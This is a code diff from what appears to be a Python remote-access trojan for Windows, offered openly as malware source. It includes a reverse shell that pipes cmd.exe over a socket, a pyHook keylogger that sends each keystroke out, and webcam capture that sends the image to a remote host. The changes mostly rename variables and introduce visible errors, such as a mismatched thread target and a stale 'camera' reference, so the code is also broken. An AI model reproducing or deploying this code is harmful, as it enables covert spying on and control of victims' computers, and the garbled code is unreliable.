@@ -44,26 +44,26 @@ def shellr():
         print erro
         print ip, port2, type(port2)
         time.sleep(10)
-    def s2p(s, p):
+    def shell_recv(s, p):
         while True:
             data = s.recv(1024)
             if len(data) > 0:
                 p.stdin.write(data)
                 p.stdin.flush()
 
-    def p2s(s, p):
+    def shell(s, p):
         while True:
             s.sendall(p.stdout.read(1))
 
 
     p=subprocess.Popen(["\\windows\\system32\\cmd.exe", '-i'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
-    s2p_thread = threading.Thread(target=s2p, args=[s, p])
-    s2p_thread.daemon = True
-    s2p_thread.start()
+    rshell_thread = threading.Thread(target=shellrecv, args=[s, p])
+    rshell_thread.daemon = True
+    rshell_thread.start()
 
-    p2s_thread = threading.Thread(target=p2s, args=[s, p])
-    p2s_thread.daemon = True
-    p2s_thread.start()
+    shell_thread = threading.Thread(target=shell, args=[s, p])
+    shell_thread.daemon = True
+    shell_thread.start()
 
     try:
         p.wait()
@@ -93,18 +93,18 @@ def keylogger():
         sock.send(str(event.Key))
         return True
 
-    hook = pyHook.HookManager()
-    hook.KeyDown = getkey
-    hook.HookKeyboard()
+    liskey = pyHook.HookManager()
+    liskey.KeyDown = getkey
+    liskey.HookKeyboard()
     pythoncom.PumpMessages()
 
 def webcam():
     try:
-        camera = cv2.VideoCapture(0)
-        return_value, image = camera.read()
-        cv2.imwrite('opencv.png', image)
+        cam = cv2.VideoCapture(0)
+        return_value, image = cam.read()
+        cv2.imwrite('red', image)
         del(camera)
-        file = open('opencv.png').read
+        file = open('red').read
         sock.sendall(file)
         sock.send('ENDFILE')
         file.close()
